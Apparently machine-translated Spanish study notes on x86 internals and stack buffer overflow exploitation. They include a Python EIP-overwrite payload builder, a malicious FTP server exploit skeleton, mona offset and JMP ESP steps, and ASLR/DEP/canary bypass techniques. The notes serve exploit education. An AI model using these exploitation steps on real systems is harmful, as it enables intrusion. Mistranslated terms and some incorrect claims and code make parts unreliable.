# Seguridad del sistema

## Arquitectura <a href="#architecture" id="architecture"></a>

### Fundamentos <a href="#fundamentals" id="fundamentals"></a>

#### CPU - Unidad Central de Proceso <a href="#cpu---central-process-unit" id="cpu---central-process-unit"></a>

es el dispositivo encargado de ejecutar el código máquina de un programa el código máquina/lenguaje es el conjunto de instrucciones que procesa la CPU Cada instrucción es un comando primitivo que ejecuta una operación específica, como mover datos, cambiar el flujo, operaciones lógicas, etc se representa en hexadecimal (HEX) se traduce al lenguaje ensamblador (ASM). NASM > ensamblador de red MASM > Microsoft Macro Assembler

#### Conjunto de instrucciones Architecutre (ISA) <a href="#instruction-set-architecutre-isa" id="instruction-set-architecutre-isa"></a>

Cada CPU tiene un es un conjunto de instrucciones es lo que un programador puede ver: memoria, registros, instrucciones, etc x86 = procesadores de 32 bits x64 = procesadores de 64 bits (también conocidos como x86\_64 o AMD64)

#### Registros <a href="#registers" id="registers"></a>

El número de bits: 32 o 64 > se refiere a la anchura de los registros de la CPU piensan como variables temporales utilizadas por la CPU para obtener y almacenar datos

#### Registros de propósito general (GPR) <a href="#general-purpose-registers-gprs" id="general-purpose-registers-gprs"></a>

```
| x86 naming convention | Name | Purpose |
| EAX | Accumulator | Used in arithmetic operation |
| ECX | Counter | Used in shift/rotate instruction and loops |
| EDX | Data | Used in arithmetic operation and I/O |
| EBX | Base | Used as a pointer to data |
| ESP | Stack Pointer | Pointer to the top of the stack |
| EBP | Base Pointer | Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer) |
| ESI | Source Index | Used as a pointer to a source in stream operation |
| EDI | Destination | Used as a pointer to a destination in stream operation |
```

#### Tipos de CPU <a href="#cpus-types" id="cpus-types"></a>

```
In 8-bit CPU:
	L = low byte
	H = high byte

In 16-bit CPU:
	combines L/H and replaces with X
	While Stack Pointer, Base pointer, source and destination removes the L

In 32-bit CPU:
	E = means extended, its used as prefix

In 64-bit CPU:
	E > R = E is replaced by the R
```

#### Convención de nombres <a href="#name-convention" id="name-convention"></a>

#### Puntero de instrucción (EIP) <a href="#instruction-pointer-eip" id="instruction-pointer-eip"></a>

Le dice a la CPU dónde está la siguiente instrucción

#### Memoria de proceso <a href="#process-memory" id="process-memory"></a>

***

0 Direcciones de memoria inferiores —————————————- |. Texto | -Instrucciones |. Datos | - Variable inicializada |BSS | - Variable no inicializada (bloque iniciado por símbolo) |Montón | - brk/sbrk > malloc, realloc, free = se puede ampliar el tamaño de la región de datos | | |Pila | —————————————- 0xFFFFFFFF Direcciones de memoria más altas —————————————-

### Pila <a href="#stack" id="stack"></a>

Último en entrar, primero en salir = LIFO Piense como una matriz utilizada para guardar direcciones de retorno de funciones, pasar argumentos de función y almacenar variables locales.

```
Stack consists of logical stack frames (portions/areas of the Stack), 
That are PUSHed when calling a function and POPed when returning a value.
```

#### ESP <a href="#esp" id="esp"></a>

El propósito del registro ESP (Stack Pointer) es identificar la parte superior de la pila y modificarla cada vez que se inserta un valor (PUSH) o se extrae (POP).

La pila crece hacia abajo, hacia las direcciones de memoria inferiores El montón crece hacia arriba, hacia las direcciones de memoria más altas

```
0 Lower Addresses | Heap >     < Stack | 0xFFFFFFFF Higher Addresses
```

#### Instrucciones PUSH <a href="#push-instructions" id="push-instructions"></a>

Instrucciones: EMPUJE E Proceso: Se ejecuta PUSH y se modifica el registro ESP Valor inicial: ESP apunta a la parte superior de la pila Resta 4 (en 32 bits) u 8 (en 64 bits) de ESP

Ejemplo:

```
ESP points to the top of the stack -4
|A|
|B|
|C|
|D|

PUSH(E)
|E| = (it decreases by 4)
|A|
|B|
|C|
|D|

Example 2:
ESP = 0x0028FF80
PUSH 1
|data|
|data|
|data|
|data|

ESP = 0x0028FF7C (it decreases by 4)
|00000001|
|data|
|data|
|data|
|data|
```

#### Instrucciones POP <a href="#pop-instructions" id="pop-instructions"></a>

Recupera datos de la parte superior de la pila y, por lo general, los almacena en otro registro Proceso: Se ejecuta el POP y se modifica el registro ESP (ESP +4) Valor inicial: ESP apunta a la parte superior de la pila Incrementos 4 (en 32 bits) u 8 (en 64 bits) desde ESP

Ejemplo:

```
ESP points to the top of the stack +4
|E|
|A|
|B|
|C|
|D|

POP(E)
|A| ESP+4
|B|
|C|
|D|

Example 2:
ESP = 0x0028FF7C

|00000001|
|data|
|data|
|data|
|data|

POP EAX
|00000001| > the value is not deleted(or zeroed). 
It will stay in the stack until another instruction overwrites it
|data| > ESP = 0x0028FF80 (it increases by 4)
|data|
|data|
|data|
```

### Bastidor de pila <a href="#stack-frame" id="stack-frame"></a>

#### Funciones <a href="#functions" id="functions"></a>

prólogo Es una secuencia de instrucciones que tienen lugar al principio de una función. Cómo se crean los marcos de pila epílogo

_El marco de pila_ realiza un seguimiento de la ubicación en la que cada subrutina debe devolver el control cuando finaliza.

Principales operaciones:

1. Cuando se llama a una función, los argumentos \[(entre paréntesis)] deben evaluarse
2. El flujo de control salta al cuerpo de la función y el programa ejecuta su código
3. Una vez que finaliza la función, se obtiene un retorno, el programa vuelve a la llamada a la función (la siguiente instrucción en el código).

Los argumentos de las funciones se insertarán en la pila de derecha a izquierda (argc, argv)

#### Prólogo <a href="#prologue" id="prologue"></a>

_Cuando el programa ingresa a una función, se ejecuta el prólogo para crear el nuevo marco de pila_ push ebp = guarda el puntero base antiguo en la pila, por lo que se puede restaurar más tarde cuando las funciones regresen mov ebp, esp = copia los valores del puntero de pila en el puntero base. En el ensamblador, el segundo operando de la instrucción (esp en este caso) es el origen, mientras que el primer operando (ebp en este caso) es el destino. Por lo tanto, esp se mueve a ebp. sub esp, X //x es un número = La instrucción resta X de esp. Para hacer espacio para las variables locales.

#### Epílogo <a href="#epilogue" id="epilogue"></a>

_La operación POP actualiza automáticamente el ESP, al igual que PUSH_

```
-------------------
leave 
ret
-------------------
-------------------
mov esp, ebp
pop ebp
ret
-------------------
```

### Endianidad <a href="#endianness" id="endianness"></a>

> Es la forma de representar (almacenar) valores en la memoria Hay 3 tipos, los más importantes: big-endian / little-endian

#### MSB - La parte más significativa <a href="#msb---the-most-significant-bit" id="msb---the-most-significant-bit"></a>

* En un binario el número es el valor más grande, generalmente el primero desde la izquierda el binario 100 = MSB 1

#### LSB - El Menos Significativo <a href="#lsb---the-least-significant" id="lsb---the-least-significant"></a>

* En un binario, el número es el valor más bajo, generalmente el primero desde la derecha. el binario 110 = LSB 0

En el Big-endian:

```
	LSB > is stored at the highest memory address
	MSB > is stored at the lowest memory address
```

0x12345678

| Memoria más alta | dirección en la memoria | Valor de bytes |
| ---------------- | ----------------------- | -------------- |
|                  | +0                      | 0x12           |
|                  | +1                      | 0x34           |
|                  | +2                      | 0x56           |
|                  | +3                      | 0x78           |
| Memoria más baja |                         |                |

En el Little-endian:

```
	LSB > is stored at the lowest memory address
	MSB > is stored at the highest memory address
```

0x12345678

| Memoria más alta | dirección en la memoria | Valor de bytes |
| ---------------- | ----------------------- | -------------- |
|                  | +0                      | 0x78           |
|                  | +1                      | 0x56           |
|                  | +2                      | 0x34           |
|                  | +3                      | 0x12           |
| Memoria más baja |                         |                |

### Sin instrucciones de operación (NOP) <a href="#no-operation-instruction-nop" id="no-operation-instruction-nop"></a>

_NOP en una instrucción en lenguaje ensamblador que no hace nada_ _Cuando el programa encuentra un NOP, simplemente saltará a la siguiente instrucción_

> En x86 = 0x90 - NOP se representan con el valor hexadecimal

La razón por la que usamos NOPs, es para permitirnos deslizarnos hacia abajo a la instrucción que queremos ejecutar Los desbordamientos de búfer deben coincidir con un tamaño y una ubicación específicos que espera el programa.

### Implementaciones de seguridad <a href="#security-implementations" id="security-implementations"></a>

```
Here is an overview of the security implementations that have been developed during the past years to prevent, or impede, the exploitation of vulnerabilities such as Buffer Overflow
```

* Aleatorización del diseño del espacio de direcciones (ASLR)
* Prevención de ejecución de datos (DEP)
* Galletas de pila (canario)

#### ASLR <a href="#aslr" id="aslr"></a>

Introducir aleatoriedad Para ejecutables, bibliotecas y pilas en el espacio de direcciones de memoria. Esto hace que sea más difícil para un atacante predecir las direcciones de memoria y hace que las vulnerabilidades de seguridad fallen y bloqueen el proceso.

#### DEP <a href="#dep" id="dep"></a>

Es una medida defensiva de hardware y software que impide la ejecución de código de páginas en memoria que no están marcadas explícitamente como ejecutables. El código insertado en la memoria no se puede ejecutar desde esa región; Esto hace que las explotaciones sean aún más difíciles.

#### Canario <a href="#canary" id="canary"></a>

Es una implementación de seguridad que coloca un valor junto a la dirección de retorno en la pila.

## Depuradores de ensambladores y arsenal de herramientas <a href="#assembler-debuggers-and-tools-arsenal" id="assembler-debuggers-and-tools-arsenal"></a>

* Assembly es un lenguaje de programación de bajo nivel que consiste en un código mnemotécnico, también conocido como código de operación (código de operación).

### Ensamblado <a href="#assembler" id="assembler"></a>

Un ensamblador es un programa que traduce el lenguaje ensamblador al código máquina.

```
Microsoft Macro Assembler (MASM)
GNU Assembler (GAS)
- Netwide Assembler (NASM)
Flat Assembler (FASM)
```

#### Procesar ensamblaje a ejecutable <a href="#process-assembly-to-executable" id="process-assembly-to-executable"></a>

Cuando se ensambla un archivo de código fuente, el archivo de resultados se denomina archivo objeto. A continuación, se necesita un enlazador para crear el archivo ejecutable real. Lo que hace Linker es tomar uno o más archivos objeto y combinarlos para crear el archivo ejecutable.

```
	ASM file > assembler > object file / static library > linker > executable
```

#### Compilador <a href="#compiler" id="compiler"></a>

convierte código fuente de alto nivel (como C) en código de bajo nivel o directamente en un archivo objeto. El resultado final es un archivo ejecutable.

### NASM <a href="#nasm" id="nasm"></a>

https://forum.nasm.us/index.php?topic=1853.0

#### Instrucciones <a href="#instructions" id="instructions"></a>

```
Data Transfer:
	MOV, XCHG, PUSH, POP
Arithmetic:
	ADD, SUB, MUL, XOR, NOT
Control Flow:
	CALL, RET, LOOP, Jcc (where cc is any condition)
Other:
	STI, CLI, IN, OUT
```

#### Ejemplo: Suma <a href="#example-sum" id="example-sum"></a>

```
MOV EAX, 2
MOV EBX, 5
ADD EAX, EBX
---------------------
store 2 in eax
store 5 in ebx
do eax = eax + ebx
now eax contains the results
```

#### Intel frente a AT\&T <a href="#intel-vs-att" id="intel-vs-att"></a>

intel(windows) = MOV EAX, 8 - at\&t (linux) = MOVL $8, %EAX -

AT\&T pone un signo de porcentaje (%) antes de los nombres de las cajas registradoras y un signo de dólar ($) antes de los números También agrega un sufijo a la instrucción, que define el tamaño del operando: Q (cuádruple - 64 bits), L (largo - 32 bits), W (palabra - 16 bits), B (byte -8 bits).

#### Más información sobre PUSH <a href="#more-about-push" id="more-about-push"></a>

push almacena un valor en la parte superior de la pila, lo que hace que la pila se ajuste en -4 bytes (en sistemas de 32 bits): -0x04

```
PUSH 0x12345678 can be similar to:
---------------------------------------------------
SUB ESP, 4
MOVE [ESP], 0x12345678
---------------------------------------------------
subtract 4 to esp -> esp=esp-4
store the value 0x12345678 to the location pointed by ESP.
square brackets indicates to address pointed by the register.
```

#### Más información sobre POP <a href="#more-about-pop" id="more-about-pop"></a>

pop lee el valor de la parte superior de la pila, lo que hace que la pila se ajuste a +0x04.

```
POP EAX operation can be done:
---------------------------------------------------
MOV EAX, [ESP]
ADD ESP, 4
---------------------------------------------------
store the value pointed by ESP into EAX 
 → the value at the top of the stack
add 4 to ESP - adjust the top of the stack
```

#### LLAMAR <a href="#call" id="call"></a>

Las subrutinas se implementan mediante el par de instrucciones CALL y RET:

```
The CALL instruction pushes the current instruction pointer (EIP) to the stack and jumps to the function address specified. Whenever the function executes the RET instruction, the last element is popped from the stack, and the CPU jumps to the address.
```

***

MOV EAX, 1 MOV EBX, 2 LLAME ADD\_sub INC EAX

JMP end\_sample ADD\_sub: AGREGAR EAX, EBX

### end\_sample: <a href="#end_sample" id="end_sample"></a>

Tienda 1 en EAX Tienda 2 en EBX Llame a la subrutina denominada ADD\_sub Incremento de EAX: Ahora EAX tiene "4" 2 (ebx) + 1 (eax) +1 (aum) —————————————————

### Arsenal de herramientas <a href="#tools-arsenal" id="tools-arsenal"></a>

```
https://sourceforge.net/projects/orwelldevcpp/
```

dev-C++ crea un directorio denominado MinGW64 cuando se almacenan todas las herramientas de compilación. Para completar archivos .c o .cpp podemos usar el compilador gcc.exe que se encuentra en la carpeta bin.

```
	linux: gcc file.c -o output
	windows: gcc -w32 file.c -o output.exe
```

#### Depuradores <a href="#debuggers" id="debuggers"></a>

* Depurador de inmunidad - https://www.immunityinc.com/products/debugger/ AIF GDB X64DBG EDB WinDBG OllyDBG Tolva

#### Descompilación <a href="#decompiling" id="decompiling"></a>

Si tiene un archivo ejecutable y se le pregunta cómo funciona, debe desensamblarlo para obtener el código ensamblador.

```
objdump -d -Mintel file.exe > disasm.txt
```

#### Depurador de inmunidad <a href="#immunity-debugger" id="immunity-debugger"></a>

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/1.png)

1 - Panel Donde se produce o se ve el código del ensamblador cuando se depura un módulo. Columnas: • 1 - ubicación de la dirección • 2 - Código de máquina • 3 - Lenguaje ensamblador • 4 - Comentarios del depurador

2 - Panel de registro • Nombres de los registros • Su contenido • Cadena ASCII, el valor de la cadena

3 - Panel de volcado de memoria Mostrar ubicaciones de memoria

4 - Panel de pila Mostrar pila de subprocesos actual Columnas: • 1 - direcciones de memoria • 2 - valores en la pila • 3 - Explicación del contenido • 4 - Comentarios del depurador

Métodos abreviados • ctrl+F2 - para reiniciar un programa • F9 - para iniciar un programa • Icono 'e' - Abrir módulos ejecutables

## Desbordamientos de búfer <a href="#buffer-overflows" id="buffer-overflows"></a>

### Visión general <a href="#overview" id="overview"></a>

buffer overflow = Para rellenar más datos de los que el búfer puede manejar.

ejemplo:

```
#include <string.h>
#include <stdio.h>
```

```
int main(int argc, char** argv)
{
	argv[1] = (char*)"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char buffer[10];
	strncpy(buffer, argv[1], sizeof(buffer));

	return 0;
}
```

0x41 es el valor hexadecimal de A El EIP se sobrescribe (puntero de instrucción), le dice al programa qué ejecutar a continuación, pero como resultado de todas nuestras A, ese valor de dirección es A.

#### Preguntas que necesitan respuestas <a href="#questions-that-need-answers" id="questions-that-need-answers"></a>

* ¿Cuántas 'A' necesitamos para bloquear la aplicación? Podemos hacer fuzz a la aplicación para descubrir dónde se bloqueó
* ¿Qué dirección queremos que se escriba en el EIP? después de saber dónde se bloqueó, podemos insertar la dirección que queremos EIP y volverá a esta dirección de memoria específica.
* podemos usar helper.cpp para enviar carga útil a EIP o con código python:

```
import sys
import os
payload = '\x41' * 22
payload += '\x48\x15\x40'
command = 'goodpwd.exe %s' %(payload)

print path
os.system(command)
```

### Búsqueda de desbordamientos de búfer <a href="#finding-buffer-overflows" id="finding-buffer-overflows"></a>

#### Cualquier aplicación que utilice operaciones no seguras puede ser vulnerable: <a href="#any-application-that-uses-unsafe-operations-might-be-vulnerable" id="any-application-that-uses-unsafe-operations-might-be-vulnerable"></a>

* strcpy
* strcat
* obtener / fgets
* Scanf / FSCANF
* VSPRINTF
* printf
* memcpy

#### Cualquier función que lleve a cabo lo siguiente puede ser vulnerable: <a href="#any-function-which-carries-out-the-following-may-be-vulnerable" id="any-function-which-carries-out-the-following-may-be-vulnerable"></a>

* no valida correctamente las entradas antes de operar
* No comprueba los límites de entrada

> Todos los lenguajes interpretados, como C#, Visual Basic, .NET, JAVA, etc., están a salvo de tales vulnerabilidades

#### BoF se puede activar: <a href="#bof-can-be-triggered" id="bof-can-be-triggered"></a>

* Entrada del usuario
* Datos cargados desde un disco
* Datos de la red

#### Si tienes acceso al código fuente: <a href="#if-you-have-access-to-the-source-code" id="if-you-have-access-to-the-source-code"></a>

* férula - http://www.splint.org/
* cppcheck - http://cppcheck.sourceforge.net/

> Cuando se produce un bloqueo, prepárese para buscar la vulnerabilidad con un depurador. Algunas empresas utilizan el fuzzing en la nube para el bloqueo por fuerza bruta (mediante entradas basadas en archivos).

#### Herramientas como: (rastrea las ejecuciones y el flujo de datos) <a href="#tools-like-tracks-the-executions-and-data-flow" id="tools-like-tracks-the-executions-and-data-flow"></a>

* Fuzzer
* trazador

_Casi el 50% de las vulnerabilidades no son explotables en absoluto, pero pueden conducir a DOS o causar otros efectos secundarios_

#### Fuzzing <a href="#fuzzing" id="fuzzing"></a>

Proporciona entrada a un programa como:

* Línea de comandos
* Datos de red
* Bases
* Entrada de teclado / ratón
* Parámetros
* Entrada de archivos
* Regiones de memoria compartida
* Variables de entorno

Básicamente, proporciona datos aleatorios al programa y luego se verifica el programa en busca de comportamiento incorrecto:

* Acaparamiento de memoria
* Acaparamiento de CPU
* Estrellarse

_Por lo tanto, su uso intensivo de recursos no se puede utilizar para probar todos los casos._

#### Algunas herramientas y frameworks de Fuzzing <a href="#some-fuzzing-tools-and-frameworks" id="some-fuzzing-tools-and-frameworks"></a>

* Plataforma de pelusa de melocotón
* Sulley
* Pelusa
* FileFuzz (en inglés)

#### Observación de código <a href="#code-observation" id="code-observation"></a>

**marco de pila de la función principal:**

```
|...|
|buffer[4]|
|Int cookie=0|
|Old EBP|
|Return address of function|
|main() parameters|
|...|
```

\[EBP - X] > variables locales \[EBP + X] > parámetros de función

_Los \[corchetes] en notación ensambladora se utilizan para indicar que estamos apuntando a la memoria_

El código no verifica la longitud de los datos y tenga en cuenta que el espacio de pila es limitado. Por lo tanto, es susceptible a un desbordamiento.

> IDA Pro = http://www.hex-rays.com

### Explotación de desbordamientos de búfer <a href="#exploiting-buffer-overflows" id="exploiting-buffer-overflows"></a>

Si conocemos el tamaño de la entrada que nos permite sobrescribir el EIP.

ESP apunta a otros

| EBP | EBP ANTIGUO | ANTIGUO EIP | OTRO |
| --- | ----------- | ----------- | ---- |
| Un  | Un          | Un          |      |

queremos sobrescribir el EIP (ABCD) con la dirección de nuestro shellcode. ya que ESP apunta a la siguiente dirección después de la ubicación de la dirección de retorno en la memoria (OTHER). ¡Podemos colocar el shellcode desde esa ubicación!

necesitamos completar los primeros 22 bytes (vars locales + EBP) con datos basura (NOP), reescribir el EIP y luego insertar el código de shell.

_Bytes basura (22 bytes) + dirección EIP (4 bytes) + Shellcode_

#### Encontrar el OFFSET adecuado <a href="#finding-the-right-offset" id="finding-the-right-offset"></a>

Podemos enviar 1500 bytes a la aplicación: Si la aplicación se bloquea > intentamos enviar la mitad (1500/2) Si se bloquea, continuaremos dividiendo la cantidad por 2. (750/2) Si no se bloquea, agregaremos la mitad de la cantidad a nuestros bytes 750+(750/2) = 1125

_Scripts como pattern\_create/pattern\_offset hacen que esta tarea sea mucho más fácil._

Después de enviar el pattern\_create: Tendremos que especificar el valor en el registro EIP hasta el punto en que la aplicación se bloquee. Proporcionar este número al segundo archivo, 'pattern\_offset' nos dará el número exacto de bytes basura que necesitamos para alcanzar el EIP.

#### Tomar el valor de Desplazamiento <a href="#grabbing-the-offset-value" id="grabbing-the-offset-value"></a>

* 1 - Generar la carga útil: ./pattern\_create.rb
* 2 - Copie la carga útil ASCII y utilícela como entrada. Una vez que se bloquee, tendremos que depurarlo para obtener el valor sobrescrito Obtenga el valor de EIP después del bloqueo. Ej: 61413761 = 0x61413761
* 3 - Copie el valor EIP y utilícelo como entrada Para el segundo script: ./pattern\_offset.rb -l -q \*toma el valor OFFSET\*

> con Immunity Debugger y Mona Podemos ejecutar todo el proceso en Immunity Debugger usando Mona. Descargue mona.py > copie en la carpeta PyCommand (dentro de la carpeta de instalación del depurador de inmunidad)

#### Proceso <a href="#process" id="process"></a>

1 - Copiar el archivo 2 - Depurador de inmunidad abierta 3 - Cargar la aplicación !mona config -set workingfolder C:\ImmunityLogs\\%p "Le estamos diciendo a Mona que use esta carpeta como carpeta de trabajo, que guarde todos los archivos allí" 4 - !mona pc = lo mismo que pattern\_create copiar el valor de EIP 5 - !mona po = lo mismo que pattern\_offset Tome el valor de desplazamiento

```
Useful command is *suggest*. Once the application crashes and the EIP is overwritten with the pattern create by Mona, we can run: *!mona suggest*
Mona will ask us to provide some information about the payload and will automatically create a Metasploit module for exploiting the application!
```

* Después de obtener el valor de desplazamiento, tenemos que sobrescribir el EIP. El valor que sobrescribimos será utilizado por la instrucción RET para devolver > a nuestro shellcode.
* En este punto, nuestro shellcode se almacena en la dirección de memoria apuntada por ESP, por lo tanto, volver a nuestro shellcode significa saltar a esa dirección. El problema es que la dirección en las pilas cambia dinámicamente.
* Por lo tanto, necesitamos encontrar la instrucción JMP ESP (o CALL ESP) que se encuentra en una ubicación fija en la memoria. De esta manera, cuando el programa regrese, saltará automáticamente al área donde se almacena nuestro shellcode.
* cuando ASLR no está habilitado podemos usar kernel32.dll funciones que se encuentran en direcciones fijas. Podemos saltar a esta línea y volver desde el kernel32 a la dirección en ESP (que contiene la primera línea de nuestro shellcode).

#### Sobrescritura del EIP <a href="#overwriting-the-eip" id="overwriting-the-eip"></a>

* Para encontrar el > CALL/JMP ESP carga el .dll a la inmunidad (o IDA) y, a continuación, busque uno de estos dos comandos: CALL ESP o JMP ESP

En el depurador de inmunidad:

```
	CTRL+F or Search For > Command
	JMP ESP or CALL ESP
```

*   Podemos encontrarlo con la herramienta findjmp2.

    ```
      findjmp.exe ntdll.dll esp
    ```
*   Con Mona

    ```
      !mona jmp -r esp 
      !mona jmp -r esp -m kernel = if we wanna to use specific module
    -r = register
    -m = module
    ```
* Recuerde que estamos trabajando en sistemas little-endian. Así que tenemos que revertir la dirección. en este caso: 0x77267D3B = \x3B\x7D\x26\x77
* Después de obtener la dirección de un ESP de llamada, necesitamos crear una carga útil que explote el vuln BoF.

> Descripción general: Necesitamos sobrescribir el EIP para que apunte a nuestro JMP ESP, mientras que el ESP se ha actualizado para apuntar a los NOP al principio de nuestro shellcode

### Explotación de un desbordamiento de búfer en el mundo real <a href="#exploiting-a-real-world-buffer-overflow" id="exploiting-a-real-world-buffer-overflow"></a>

* FTP de 32 bits de ElectraSoft

```

#!/usr/bin/python

from socket import *

payload = "Here we will insert the payload"

s = socket(AF_INET, SOCK_STREAM)
s.bind(("127.0.0.1", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
print "[+] Client exploited !! quitting"
s.close()

```

> Para que esto funcionara, teníamos que ejecutar en la misma caja tanto el script como el servidor vuln

#### BOF101 <a href="#bof101" id="bof101"></a>

> enviar fuzz para bloquear la aplicación
>
> ```
> !mona po <EIP>
> offset = 989
> jmp esp = 77267d3b = \x3B\x7D\x26\x77
> payload = junk*<offset> + jmp esp value + NOPs + shell
> ```

### Implementaciones de seguridad <a href="#security-implementations-1" id="security-implementations-1"></a>

#### Herramientas útiles <a href="#helpful-tools" id="helpful-tools"></a>

EMET - Kit de herramientas de experiencia de mitigación mejorada ofrece muchas mitigaciones diferentes: DEP, ASLR, SEHOP y más. https://support.microsoft.com/en-us/kb/2458544

#### ASLR - Aleatorización del diseño del espacio de direcciones <a href="#aslr---address-space-layout-randomization" id="aslr---address-space-layout-randomization"></a>

Introducir aleatoriedad para ejecutables, bibliotecas y pila en el espacio de direcciones de proceso, lo que dificulta que un atacante prediga las direcciones de memoria. Hoy en día, todos los sistemas operativos implementan ASLR. El sistema operativo carga el mismo ejecutable en diferentes ubicaciones de la memoria en cada reinicio. Por lo tanto, los exploits que funcionan apuntando a ubicaciones de memoria conocidas ya no tendrán éxito.

> info: ASLR no está habilitado en todos los módulos, por lo que podría haber una dll (u otro módulo) en el espacio de direcciones que no lo use, lo que hace que el proceso sea vulnerable a un ataque de omisión de ASLR.

* Verifique si está habilitado Explorador de procesos - http://technet.microsoft.com/en-us/sysinternals/bb896653 Depurador de inmunidad > módulos !mona o !mona noaslr

#### Técnica de derivación <a href="#bypass-technique" id="bypass-technique"></a>

```
resource > https://www.corelan.be/ - Non-randomized modules
try to find a module that does not have ASLR enabled and then use a simple JMP/CALL ESP from that module. basically what we did earlier. - Bruteforce
ASLR can be forced by overwriting the return pointer with plausible addresses until, ath some point, we reach the shellcode.
The success depends on how tolerant the application is to receive variations and many exploitation attempts. - NOP-Sled
create a big area of NOPs in order to increase the chances to jump to the shellcode.
since the processor skips NOPs until it gets to something to execute, more nops we can place before our shellcode, more chances we have to land on one of these nops.
the attacker does not need a high degree of accuracy to be successfull.
https://www.fireeye.com/blog/threat-research/2013/10/aslr-bypass-apocalypse-in-lately-zero-day-exploits.html
```

### Medidas de protección <a href="#protective-measures" id="protective-measures"></a>

* http://blogs.technet.com/b/srd/archive/2010/12/08/on-the-effectiveness-of-dep-and-aslr.aspx
* https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
* https://www.exploit-db.com/docs/english/17914-bypassing-aslrdep.pdf
* https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/

#### DEP - Prevención de Ejecución de Datos <a href="#dep---data-execution-prevention" id="dep---data-execution-prevention"></a>

es una medida defensiva de hardware y software, DEP ayuda a prevenir ciertos exploits en los que el atacante inyecta nuevo código en la pila.

* Técnica de derivación ROP - Programación Orientada al Retorno - https://cseweb.ucsd.edu/\~hovav/talks/blackhat08.html ROP consiste en encontrar múltiples instrucciones de máquina en el programa (gadget), con el fin de crear una cadena de instrucciones que hagan algo. dado que las instrucciones son parte de la pila, DEP no se aplica a ellas. Podemos usar gadgets ROP para llamar a una función de protección de memoria (API del kernel como VirtualProtect) que se puede usar para marcar el stach como ejecutable; Esto nos permitirá ejecutar nuestro shellcode. También podemos usar gadgets ROP para ejecutar comandos directos o copiar datos en regiones ejecutables y luego saltar a ellos. https://www.corelan.be/index.php/security/rop-gadgets/ https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/#buildingblocks

> Si DEP y ASLR están habilitados, a veces es imposible lograr la ejecución de código en un solo intento

#### Stack Canary (Galleta de pila) <a href="#stack-canary-stack-cookie" id="stack-canary-stack-cookie"></a>

Su propósito es modificar casi todas las funciones prologue y epilogue para colocar un pequeño valor entero aleatorio (canary) justo antes de la instrucción de retorno y detectar si se produce un desbordamiento de búfer. Cuando se produce el BOF, el canario también se sobrescribe.

* La función prologue carga el valor aleatorio en la ubicación de valor controlado y el epílogo se asegura de que el valor no esté dañado.
* Técnica de derivación Uno puede intentar recuperar o adivinar el valor canario y agregarlo a la carga útil. Si el valor controlado no coincide, se activará el controlador de excepciones. Si el atacante puede sobrescribir la estructura del controlador de excepciones (SEH) y desencadenar una excepción antes de que se compruebe el valor canary, el bof aún podría ejecutarse.

#### SafeSEH (en inglés) <a href="#safeseh" id="safeseh"></a>

https://msdn.microsoft.com/en-us/library/9a89h429.aspx https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/

Trineo NOP

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/2.png)

DEP

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/3.png)

Canario

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/4.png)

## Shellcoding <a href="#shellcoding" id="shellcoding"></a>

### Ejecución de un shellcode[Enlace permanente](https://johnermac.github.io/notes/ecppt/systemsecurity/#execution-of-a-shellcode) <a href="#execution-of-a-shellcode" id="execution-of-a-shellcode"></a>

Cuando el shellcode se inyecta correctamente, el registro de puntero de instrucción (EIP) se ajusta para que apunte al shellcode. En este punto, el shellcode se ejecuta sin restricciones.

Formas de enviar:

```
	through the network (remote buffer overflow)
	through the local environment
```

> Es posible que un shellcode se ejecute cuando se activa una trama SEH (Structured Exception Handling). Las tramas SEH almacenan la dirección a la que saltar cuando hay una excepción, como la división por cero. Al sobrescribir la dirección de retorno, el atacante puede tomar el control de la ejecución.

### Tipos de Shellcode <a href="#types-of-shellcode" id="types-of-shellcode"></a>

```
Local shellcode
Remote shellcode
```

#### Código de shell local = Escalada de privilegios <a href="#local-shellcode--privilege-escalation" id="local-shellcode--privilege-escalation"></a>

Se utiliza para explotar procesos locales con el fin de obtener mayores privilegios en esa máquina.

#### Shellcode remoto = Ejecución remota de código (RCE) <a href="#remote-shellcode--remote-code-execution-rce" id="remote-shellcode--remote-code-execution-rce"></a>

Se envía a través de la red junto con un exploit. El exploit permitirá que el shellcode se inyecte en el proceso y se ejecute.

* _Volver a conectar_ → inicia una conexión con la máquina de los atacantes
* _Enlazar_ shell → enlaza un shell (o símbolo del sistema) a un puerto determinado en el que el atacante puede conectarse
* _Reutilización de sockets_ → establece una conexión con un proceso vulnerable que no se cierra antes de que se ejecute el shellcode. El shellcode puede reutilizar esta conexión para comunicarse con el atacante. Sin embargo, debido a su complejidad, generalmente no se utilizan.

#### Escena <a href="#staged" id="staged"></a>

→ usa cuando el tamaño del shellcode es mayor que el espacio que un atacante puede usar para la inyección (dentro del proceso) En este caso, se ejecuta un pequeño fragmento de shellcode (etapa 1). A continuación, este código obtiene un fragmento más grande de shellcode (etapa 2) en la memoria del proceso y lo ejecuta. puede ser local o remoto Búsqueda de huevos o tortilla

_Código de shell de búsqueda de huevos_ Se utiliza cuando se puede inyectar un shellcode más grande en el proceso, pero se desconoce en qué parte del proceso se inyectará realmente este shellcode. Se divide en dos piezas:

```
	A small shellcode (egg-hunter)
	The actual bigger shellcode (egg)
```

el shellcode del cazador de huevos tiene que buscar el huevo (código de shell más grande) dentro del espacio de direcciones del proceso.

_Código de concha de tortilla_ Similar al shellcode de la búsqueda de huevos, pero no tiene un shellcode más grande (el huevo), tiene una serie de shellcodes más pequeños (huevos). Se combinan entre sí y se ejecutan (enlace a torrente) Se utiliza para evitar los detectores de shellcode. Los códigos pequeños no generan alarmas en el sistema.

